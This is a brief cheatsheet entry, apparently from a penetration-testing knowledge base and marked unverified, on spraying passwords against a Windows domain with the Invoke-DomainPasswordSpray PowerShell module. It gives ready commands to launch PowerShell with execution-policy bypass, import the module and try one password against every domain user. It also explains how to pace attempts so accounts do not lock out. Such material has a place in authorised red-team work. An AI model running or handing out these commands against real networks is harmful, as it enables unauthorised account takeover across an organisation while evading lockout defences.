---
id: 78561425-1423-4154-9733-fffc118aceb0
name: Domain Password Spraying
type: cheatsheet
verified: false
created_at: '2020-07-14T18:20:57.499373+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Domain Password Spraying

**Command** ([[Open a PowerShell terminal from the Windows command line with ‘powershell.exe -exec bypass’.]]):

```bash
Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.

```

The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.

The following command will automatically generate a list of users from the current user’s domain and attempt to authenticate using each username and a password of Winter2016.

**Command** ([[Generate a list of users from the current domain and attempt to authenticate to each user with specified password]]):

```powershell
PowerShell Invoke-DomainPasswordSpray -Password Winter2016

```
